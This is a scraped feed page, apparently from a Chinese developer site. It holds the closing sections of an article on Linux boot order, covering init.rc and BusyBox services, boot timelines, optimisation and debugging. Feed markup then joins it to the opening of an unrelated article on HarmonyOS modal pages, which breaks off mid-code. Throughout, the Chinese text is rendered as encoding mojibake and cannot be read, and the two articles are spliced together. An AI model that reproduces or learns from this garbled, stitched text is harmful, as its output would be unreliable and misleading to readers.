<p>ä»¥æœ¬ç³»ç»Ÿä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> S10boot (START=10)
<span class="hljs-bullet">   -</span> æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ
<span class="hljs-bullet">   -</span> åˆå§‹åŒ–ç¡¬ä»¶
<span class="hljs-bullet">   -</span> åŠ è½½å†…æ ¸æ¨¡å—

<span class="hljs-bullet">2.</span> S12syslogd (START=12)
<span class="hljs-bullet">   -</span> å¯åŠ¨ç³»ç»Ÿæ—¥å¿—æœåŠ¡

<span class="hljs-bullet">3.</span> S13klogd (START=13)
<span class="hljs-bullet">   -</span> å¯åŠ¨å†…æ ¸æ—¥å¿—æœåŠ¡

<span class="hljs-bullet">4.</span> S15init.rc (START=15, DEPEND=boot)
<span class="hljs-bullet">   -</span> å¯åŠ¨init.rcæœåŠ¡
<span class="hljs-bullet">   -</span> è§£æ/etc/init.rc
<span class="hljs-bullet">   -</span> æ‰§è¡Œè§¦å‘å™¨
<span class="hljs-bullet">   -</span> å¯åŠ¨å®šä¹‰çš„æœåŠ¡

<span class="hljs-bullet">5.</span> S80auto<span class="hljs-emphasis">_startup (START=80, DEPEND=init.rc)
   - å¯åŠ¨è‡ªåŠ¨å¯åŠ¨çš„åº”ç”¨
</span></code></pre>
<hr/>
<h2 data-id="heading-199">9. å¯åŠ¨æµç¨‹æ€»ç»“</h2>
<h3 data-id="heading-200">9.1 å®Œæ•´å¯åŠ¨æ—¶é—´çº¿</h3>
<h4 data-id="heading-201">9.1.1 æœ¬ç³»ç»Ÿï¼ˆä½¿ç”¨init.rcï¼‰çš„å¯åŠ¨æ—¶é—´çº¿</h4>
<pre><code class="hljs language-csharp" lang="csharp">æ—¶é—´    é˜¶æ®µ                    å…³é”®æ“ä½œ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<span class="hljs-number">0</span>ms     ç¡¬ä»¶ä¸Šç”µ                 CPUå¤ä½
<span class="hljs-number">1</span>ms     BootROM                æ‰§è¡ŒèŠ¯ç‰‡å›ºä»¶
<span class="hljs-number">10</span><span class="hljs-function">ms    <span class="hljs-title">Bootloader</span> (<span class="hljs-params">U-Boot</span>)    åˆå§‹åŒ–ç¡¬ä»¶ï¼ŒåŠ è½½å†…æ ¸
100ms   å†…æ ¸è§£å‹                è§£å‹å†…æ ¸é•œåƒ
150ms   æ±‡ç¼–åˆå§‹åŒ–              è®¾ç½®MMUã€é¡µè¡¨
200ms   start_kernel            åˆå§‹åŒ–å†…æ ¸å­ç³»ç»Ÿ
500ms   kernel_init             å‡†å¤‡ç”¨æˆ·ç©ºé—´
600ms   BusyBox <span class="hljs-keyword">init</span>            è¯»å–/etc/inittab
650ms   rcSè„šæœ¬                 æ‰§è¡Œ/etc/<span class="hljs-keyword">init</span>.d/rcS S boot
700ms   BootæœåŠ¡ (<span class="hljs-params">S10boot</span>)       æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€åˆå§‹åŒ–ç¡¬ä»¶
800ms   æ—¥å¿—æœåŠ¡ (<span class="hljs-params">S12-S13</span>)       å¯åŠ¨syslogdã€klogd
900ms   Init.rcæœåŠ¡ (<span class="hljs-params">S15</span>)       å¯åŠ¨<span class="hljs-keyword">init</span>.rcï¼Œè§£æ/etc/<span class="hljs-keyword">init</span>.rc
1000ms  Init.rcè§¦å‘å™¨           æ‰§è¡Œ<span class="hljs-keyword">on</span> <span class="hljs-keyword">init</span>ã€<span class="hljs-keyword">on</span> bootè§¦å‘å™¨
1100ms  Init.rcæœåŠ¡             å¯åŠ¨å®šä¹‰çš„æœåŠ¡
1200ms  è‡ªåŠ¨å¯åŠ¨ (<span class="hljs-params">S80</span>)          å¯åŠ¨è‡ªåŠ¨å¯åŠ¨çš„åº”ç”¨
1500ms  ç³»ç»Ÿå°±ç»ª                ç³»ç»Ÿå®Œå…¨å¯åŠ¨
</span></code></pre>
<h4 data-id="heading-202">9.1.2 é€šç”¨Linuxç³»ç»Ÿï¼ˆä½¿ç”¨systemdï¼‰çš„å¯åŠ¨æ—¶é—´çº¿</h4>
<pre><code class="hljs language-csharp" lang="csharp">æ—¶é—´    é˜¶æ®µ                    å…³é”®æ“ä½œ
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<span class="hljs-number">0</span>ms     ç¡¬ä»¶ä¸Šç”µ                 CPUå¤ä½
<span class="hljs-number">1</span>ms     BootROM                æ‰§è¡ŒèŠ¯ç‰‡å›ºä»¶
<span class="hljs-number">10</span>ms    Bootloader              åˆå§‹åŒ–ç¡¬ä»¶ï¼ŒåŠ è½½å†…æ ¸
<span class="hljs-number">100</span>ms   å†…æ ¸è§£å‹                è§£å‹å†…æ ¸é•œåƒ
<span class="hljs-number">150</span>ms   æ±‡ç¼–åˆå§‹åŒ–              è®¾ç½®MMUã€é¡µè¡¨
<span class="hljs-number">200</span>ms   start_kernel            åˆå§‹åŒ–å†…æ ¸å­ç³»ç»Ÿ
<span class="hljs-number">500</span>ms   kernel_init             å‡†å¤‡ç”¨æˆ·ç©ºé—´
<span class="hljs-number">600</span>ms   ç”¨æˆ·ç©ºé—´<span class="hljs-keyword">init</span>            å¯åŠ¨systemd
<span class="hljs-number">1000</span>ms  ç³»ç»ŸæœåŠ¡                å¯åŠ¨å„ç§æœåŠ¡
<span class="hljs-number">2000</span>ms  ç™»å½•ç•Œé¢                æ˜¾ç¤ºç™»å½•ç•Œé¢
<span class="hljs-number">3000</span>ms  ç”¨æˆ·ç™»å½•                ç”¨æˆ·ç™»å½•
<span class="hljs-number">3500</span>ms  ç”¨æˆ·ä¼šè¯                å¯åŠ¨æ¡Œé¢ç¯å¢ƒ
<span class="hljs-number">4000</span>ms  ç³»ç»Ÿå°±ç»ª                ç³»ç»Ÿå®Œå…¨å¯åŠ¨
</code></pre>
<h3 data-id="heading-203">9.2 å…³é”®é‡Œç¨‹ç¢‘</h3>
<h4 data-id="heading-204">9.2.1 å†…æ ¸é˜¶æ®µé‡Œç¨‹ç¢‘</h4>
<ol>
<li><strong>MMUå¯ç”¨</strong>: å†…æ ¸å¯ä»¥ä½¿ç”¨è™šæ‹Ÿåœ°å€</li>
<li><strong>è°ƒåº¦å™¨å°±ç»ª</strong>: å¯ä»¥è¿è¡Œå¤šä¸ªä»»åŠ¡</li>
<li><strong>ä¸­æ–­å¯ç”¨</strong>: å¯ä»¥å“åº”ç¡¬ä»¶äº‹ä»¶</li>
<li><strong>æ ¹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½</strong>: å¯ä»¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿ</li>
</ol>
<h4 data-id="heading-205">9.2.2 ç”¨æˆ·ç©ºé—´é˜¶æ®µé‡Œç¨‹ç¢‘ï¼ˆæœ¬ç³»ç»Ÿï¼‰</h4>
<ol>
<li><strong>Initè¿›ç¨‹å¯åŠ¨</strong>: ç”¨æˆ·ç©ºé—´å¼€å§‹è¿è¡Œ</li>
<li><strong>BootæœåŠ¡å®Œæˆ</strong>: æ–‡ä»¶ç³»ç»ŸæŒ‚è½½å®Œæˆï¼Œç¡¬ä»¶åˆå§‹åŒ–å®Œæˆ</li>
<li><strong>Init.rcæœåŠ¡å¯åŠ¨</strong>: init.rcè§£æå’Œæ‰§è¡Œ</li>
<li><strong>Init.rcè§¦å‘å™¨æ‰§è¡Œ</strong>: on initã€on bootç­‰è§¦å‘å™¨æ‰§è¡Œ</li>
<li><strong>ç³»ç»ŸæœåŠ¡å¯åŠ¨</strong>: æ‰€æœ‰å®šä¹‰çš„æœåŠ¡å¯åŠ¨</li>
<li><strong>è‡ªåŠ¨å¯åŠ¨åº”ç”¨</strong>: åº”ç”¨è‡ªåŠ¨å¯åŠ¨</li>
<li><strong>ç³»ç»Ÿå°±ç»ª</strong>: ç³»ç»Ÿå®Œå…¨å¯åŠ¨ï¼Œå¯ä»¥äº¤äº’</li>
</ol>
<h4 data-id="heading-206">9.2.3 é€šç”¨ç³»ç»Ÿé‡Œç¨‹ç¢‘</h4>
<ol>
<li><strong>Initè¿›ç¨‹å¯åŠ¨</strong>: ç”¨æˆ·ç©ºé—´å¼€å§‹è¿è¡Œ</li>
<li><strong>Systemdå¯åŠ¨</strong>: systemdè¿›ç¨‹å¯åŠ¨</li>
<li><strong>ç³»ç»ŸæœåŠ¡å¯åŠ¨</strong>: ç³»ç»ŸåŠŸèƒ½å°±ç»ª</li>
<li><strong>ç”¨æˆ·ç™»å½•</strong>: ç”¨æˆ·å¯ä»¥äº¤äº’</li>
</ol>
<h3 data-id="heading-207">9.3 å¯åŠ¨ä¼˜åŒ–</h3>
<h4 data-id="heading-208">9.3.1 å†…æ ¸å¯åŠ¨ä¼˜åŒ–</h4>
<ul>
<li><strong>å‡å°‘initcalls</strong>: ç§»é™¤ä¸å¿…è¦çš„åˆå§‹åŒ–</li>
<li><strong>å¹¶è¡Œåˆå§‹åŒ–</strong>: å¹¶è¡Œæ‰§è¡Œæ²¡æœ‰ä¾èµ–çš„åˆå§‹åŒ–</li>
<li><strong>å»¶è¿Ÿåˆå§‹åŒ–</strong>: å»¶è¿Ÿéå…³é”®åˆå§‹åŒ–</li>
<li><strong>å‹ç¼©å†…æ ¸</strong>: ä½¿ç”¨å‹ç¼©å†…æ ¸å‡å°‘åŠ è½½æ—¶é—´</li>
</ul>
<h4 data-id="heading-209">9.3.2 ç”¨æˆ·ç©ºé—´å¯åŠ¨ä¼˜åŒ–ï¼ˆæœ¬ç³»ç»Ÿï¼‰</h4>
<ul>
<li><strong>ä¼˜åŒ–Bootè„šæœ¬</strong>: å‡å°‘æ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥å’ŒæŒ‚è½½æ—¶é—´</li>
<li><strong>å‡å°‘å¯åŠ¨æœåŠ¡</strong>: åªå¯åŠ¨å¿…è¦çš„æœåŠ¡</li>
<li><strong>ä¼˜åŒ–Init.rc</strong>: å‡å°‘ä¸å¿…è¦çš„è§¦å‘å™¨å’ŒæœåŠ¡</li>
<li><strong>å¹¶è¡Œå¯åŠ¨</strong>: åˆ©ç”¨procdçš„å¹¶è¡Œå¯åŠ¨èƒ½åŠ›</li>
<li><strong>å»¶è¿Ÿå¯åŠ¨</strong>: å°†éå…³é”®æœåŠ¡æ ‡è®°ä¸ºdisabledï¼Œéœ€è¦æ—¶å†å¯åŠ¨</li>
<li><strong>ä¼˜åŒ–ä¾èµ–å…³ç³»</strong>: åˆç†è®¾ç½®DEPENDï¼Œé¿å…ä¸å¿…è¦çš„ç­‰å¾…</li>
</ul>
<h4 data-id="heading-210">9.3.3 é€šç”¨ç³»ç»Ÿå¯åŠ¨ä¼˜åŒ–</h4>
<ul>
<li><strong>å¹¶è¡Œå¯åŠ¨æœåŠ¡</strong>: å¹¶è¡Œå¯åŠ¨æ²¡æœ‰ä¾èµ–çš„æœåŠ¡</li>
<li><strong>å»¶è¿Ÿå¯åŠ¨</strong>: å»¶è¿Ÿéå…³é”®æœåŠ¡</li>
<li><strong>å‡å°‘å¯åŠ¨æœåŠ¡</strong>: åªå¯åŠ¨å¿…è¦çš„æœåŠ¡</li>
<li><strong>ä¼˜åŒ–å¯åŠ¨è„šæœ¬</strong>: ä¼˜åŒ–å¯åŠ¨è„šæœ¬æ‰§è¡Œæ—¶é—´</li>
</ul>
<h3 data-id="heading-211">9.4 å¯åŠ¨é—®é¢˜æ’æŸ¥</h3>
<h4 data-id="heading-212">9.4.1 å¸¸è§é—®é¢˜</h4>
<ol>
<li><strong>å†…æ ¸panic</strong>: æ£€æŸ¥å†…æ ¸æ—¥å¿—</li>
<li><strong>æ ¹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½å¤±è´¥</strong>: æ£€æŸ¥æ ¹è®¾å¤‡é…ç½®</li>
<li><strong>Initè¿›ç¨‹æ— æ³•å¯åŠ¨</strong>: æ£€æŸ¥initç¨‹åºè·¯å¾„</li>
<li><strong>æœåŠ¡å¯åŠ¨å¤±è´¥</strong>: æ£€æŸ¥æœåŠ¡é…ç½®å’Œä¾èµ–</li>
</ol>
<h4 data-id="heading-213">9.4.2 è°ƒè¯•æ–¹æ³•</h4>
<ol>
<li><strong>å†…æ ¸æ—¥å¿—</strong>: <code>dmesg</code>æŸ¥çœ‹å†…æ ¸æ—¥å¿—</li>
<li><strong>å¯åŠ¨æ—¥å¿—</strong>: æŸ¥çœ‹systemdæ—¥å¿—</li>
<li><strong>å•ç”¨æˆ·æ¨¡å¼</strong>: è¿›å…¥å•ç”¨æˆ·æ¨¡å¼æ’æŸ¥</li>
<li><strong>initramfsè°ƒè¯•</strong>: åœ¨initramfsä¸­æ·»åŠ è°ƒè¯•å·¥å…·</li>
</ol>
<hr/>
<h2 data-id="heading-214">10. é™„å½•</h2>
<h3 data-id="heading-215">10.1 å…³é”®æ•°æ®ç»“æ„</h3>
<h4 data-id="heading-216">10.1.1 init_task</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> <span class="hljs-title">init_task</span> =</span> {
    .pid = <span class="hljs-number">0</span>,
    .comm = <span class="hljs-string">"swapper"</span>,
    <span class="hljs-comment">// ... å…¶ä»–å­—æ®µ</span>
};
</code></pre>
<p>å†…æ ¸çš„ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼Œç”¨äºæ—©æœŸåˆå§‹åŒ–ã€‚</p>
<h4 data-id="heading-217">10.1.2 å¯åŠ¨å‚æ•°</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">char</span> boot_command_line[COMMAND_LINE_SIZE];  <span class="hljs-comment">// å¯åŠ¨å‘½ä»¤è¡Œ</span>
<span class="hljs-type">char</span> *saved_command_line;                   <span class="hljs-comment">// ä¿å­˜çš„å‘½ä»¤è¡Œ</span>
</code></pre>
<p>ä¿å­˜å†…æ ¸å¯åŠ¨å‚æ•°ã€‚</p>
<h3 data-id="heading-218">10.2 å…³é”®å‡½æ•°è°ƒç”¨é“¾</h3>
<pre><code class="hljs language-bash" lang="bash">ç¡¬ä»¶ä¸Šç”µ
    â†“
BootROM
    â†“
U-Boot
    â†“
<span class="hljs-built_in">arch</span>/arm/boot/compressed/head.S:start
    â†“
è§£å‹å†…æ ¸
    â†“
<span class="hljs-built_in">arch</span>/arm/kernel/head.S:stext
    â†“
<span class="hljs-built_in">arch</span>/arm/kernel/head-common.S:__mmap_switched
    â†“
init/main.c:start_kernel
    â†“
init/main.c:rest_init
    â†“
init/main.c:kernel_init
    â†“
ç”¨æˆ·ç©ºé—´initç¨‹åº
</code></pre>
<h3 data-id="heading-219">10.3 å‚è€ƒæ–‡æ¡£</h3>
<ul>
<li>Linuxå†…æ ¸æºç : <code>linux-5.15-origin/</code></li>
<li>å†…æ ¸æ–‡æ¡£: <code>Documentation/</code></li>
<li>U-Bootæ–‡æ¡£: U-Bootå®˜æ–¹æ–‡æ¡£</li>
<li>Systemdæ–‡æ¡£: systemdå®˜æ–¹æ–‡æ¡£</li>
</ul>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡å°±å¯ææ¸…æ¥šçš„HarmonyOS6.0è§£é”æ¨¡æ€é¡µé¢çš„â€œçœŸé¦™â€æ“ä½œ]]></title>    <link>https://juejin.cn/post/7512282349485719593</link>    <guid>https://juejin.cn/post/7512282349485719593</guid>    <pubDate>2025-06-05T10:25:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7512282349485719593" data-draft-id="7512284328866496524" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡å°±å¯ææ¸…æ¥šçš„HarmonyOS6.0è§£é”æ¨¡æ€é¡µé¢çš„â€œçœŸé¦™â€æ“ä½œ"/> <meta itemprop="keywords" content="æ¶æ„"/> <meta itemprop="datePublished" content="2025-06-05T10:25:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜Feri"/> <meta itemprop="url" content="https://juejin.cn/user/2909785546561066"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡å°±å¯ææ¸…æ¥šçš„HarmonyOS6.0è§£é”æ¨¡æ€é¡µé¢çš„â€œçœŸé¦™â€æ“ä½œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2909785546561066/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜Feri
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-06-05T10:25:20.000Z" title="Thu Jun 05 2025 10:25:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-06-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">0.å‰è¨€</h2>
<p>æœ€è¿‘åœ¨æè€ƒè¯•Appçš„HarmonyOS NEXTåŸç”Ÿå¼€å‘ï¼Œå¡åœ¨è€ƒè¯•åŠŸèƒ½çš„ç­”é¢˜å¡æ˜¾ç¤ºä¸Šã€‚ä¸€å¼€å§‹ç”¨å¼¹æ¡†åšç­”é¢˜å¡ï¼Œæ•ˆæœå ªç§°â€œä¹°å®¶ç§€vså–å®¶ç§€â€â€”â€”ä¸‘åˆ°æƒ³ç»™äº§å“ç»ç†é€’è¾èŒä¿¡ï¼ˆä¸æ˜¯ï¼‰ã€‚ç—›å®šæ€ç—›åï¼Œæˆ‘å‘ç°äº†æ¨¡æ€é¡µé¢è¿™ä¸ªâ€œç¥å™¨â€ï¼Œç®€ç›´æ‰“å¼€æ–°ä¸–ç•Œå¤§é—¨ï¼ä»Šå¤©å°±æ¥å’Œå¤§å®¶èŠèŠè¿™ç©æ„å„¿æ€ä¹ˆç©ï½</p>
<h2 data-id="heading-1">1.æ¨¡æ€é¡µé¢ï¼šå¼¹çª—ç•Œçš„â€œå˜å½¢é‡‘åˆšâ€ğŸ¤–</h2>
<p>æƒ³è±¡ä¸€ä¸‹ï¼šä½ æ­£åœ¨æ‰“æ¸¸æˆï¼ˆå½“å‰ä¸Šä¸‹æ–‡ï¼‰ï¼Œçªç„¶å¼¹å‡ºä¸€ä¸ªä»»åŠ¡é¢æ¿ï¼ˆæ¨¡æ€é¡µé¢ï¼‰ï¼Œæ—¢ä¸æŒ¡ä½æ¸¸æˆç”»é¢ï¼Œåˆèƒ½è®©ä½ ä¸“æ³¨å¤„ç†ä»»åŠ¡â€”â€”è¿™å°±æ˜¯æ¨¡æ€é¡µé¢çš„é­…åŠ›ï¼<br/>
å®ƒæ˜¯ä¸ªâ€œå¤§é¢æ¿äº¤äº’å¼å¼¹çª—â€ï¼Œå’Œæ™®é€šå¼¹çª—æœ€å¤§çš„åŒºåˆ«æ˜¯<strong>å†…å®¹å…¨é è‡ªå®šä¹‰</strong>ï¼Œæƒ³å¡å¤šå°‘ä¸œè¥¿å¡å¤šå°‘ï¼ˆæ¯”å¦‚ä½ çš„è€ƒè¯•ç­”é¢˜å¡ï¼‰ã€‚ArkUIæä¾›äº†ä¸¤ç§å½¢æ€ï¼š</p>
<ul>
<li><strong>åŠæ¨¡æ€</strong>ï¼šéå…¨å±å¼¹çª—ï¼Œå…è®¸åº•å±‚é¡µé¢â€œéœ²ä¸ªè„¸â€ï¼Œé€‚åˆåšè½»é‡çº§æ“ä½œï¼ˆæ¯”å¦‚é€‰æ—¥æœŸã€å¡«å¤‡æ³¨ï¼‰ã€‚</li>
<li><strong>å…¨æ¨¡æ€</strong>ï¼šéœ¸é“æ€»è£å¼å…¨å±è¦†ç›–ï¼Œå¿…é¡»ä¾§æ»‘æ‰èƒ½é€€å‡ºï¼Œé€‚åˆéœ€è¦æ²‰æµ¸å¼æ“ä½œçš„åœºæ™¯ï¼ˆæ¯”å¦‚çœ‹è¶…é•¿ç­”é¢˜å¡ï¼‰ã€‚</li>
</ul>
<p><strong>åˆ’é‡ç‚¹</strong>ï¼šåŠæ¨¡æ€æ”¯æŒä¾§æ»‘ã€ç‚¹è’™å±‚ã€ç‚¹å…³é—­æŒ‰é’®é€€å‡ºï¼Œå…¨æ¨¡æ€é»˜è®¤åªèƒ½ä¾§æ»‘â€”â€”ä¸“æ²»æ‰‹æ®‹å…šè¯¯è§¦ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58cce7d5f0f74880934538f7d41f4123~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGYRmVyaQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472895&amp;x-signature=ntlcn3rztJU7AtETeHxzxIgWV1k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">2.åŠæ¨¡æ€é¡µé¢ï¼šæ¸©æŸ”çš„â€œä¾§è¾¹å°åŠ©æ‰‹â€ğŸ‘¨ğŸ’»</h2>
<p>åŠæ¨¡æ€å°±åƒä½ çš„è´´å¿ƒå°ç§˜ä¹¦ï¼Œä¸é®æŒ¡ä¸»ç•Œé¢ï¼Œå´èƒ½å¸®ä½ å¿«é€Ÿå®Œæˆä»»åŠ¡ã€‚æ¯”å¦‚åšä¸ªâ€œçºªå¿µæ—¥ç®¡ç†â€åŠŸèƒ½ï¼Œé€‰æ—¥æœŸã€å†™å¤‡æ³¨ä¸€æ°”å‘µæˆï½</p>
<h3 data-id="heading-3">ç”Ÿå‘½å‘¨æœŸï¼šå¼¹çª—çš„â€œå¿ƒè·³è®°å½•â€ğŸ“…</h3>
<p>åŠæ¨¡æ€çš„ä¸€ç”Ÿå¾ˆç®€å•ï¼š<br/>
<code>è¯ç”Ÿå‰ï¼ˆonWillAppearï¼‰â†’ ç™»åœºï¼ˆonAppearï¼‰â†’ æ¶ˆå¤±å‰ï¼ˆonWillDisappearï¼‰â†’ é€€åœºï¼ˆonDisappearï¼‰</code><br/>
å°±åƒèˆå°ä¸Šçš„æ¼”å‘˜ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½æœ‰ä¸“å±BGMï¼ˆå›è°ƒå‡½æ•°ï¼‰ï¼Œæ–¹ä¾¿ä½ éšæ—¶â€œæ“æ§â€å®ƒçš„çŠ¶æ€ï½</p>
<h3 data-id="heading-4">ä»£ç å®ç°ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ æ­ä¸€ä¸ªâ€œçºªå¿µæ—¥å°åŠ©æ‰‹â€ğŸš€</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Entry</span>
<span class="hljs-keyword">@Component</span>
structÂ IndexÂ {
Â Â <span class="hljs-comment">//Â å®šä¹‰é¡µé¢æ˜¯å¦æ˜¾ç¤ºçš„çŠ¶æ€ï¼ˆæ˜¯ä¸æ˜¯å¾ˆåƒå¼€å…³ï¼Ÿï¼‰</span>
Â Â <span class="hljs-keyword">@State</span>Â <span class="hljs-attribute">isShow</span>:boolean=false;
Â Â <span class="hljs-comment">//Â é€‰ä¸­çš„æ—¥æœŸï¼šé»˜è®¤ä»Šå¤©ï¼Œé˜²æ­¢ç”¨æˆ·é€‰â€œæ˜å¤©è€ƒè¯•â€è¿™ç§é­”å¹»æ“ä½œ</span>
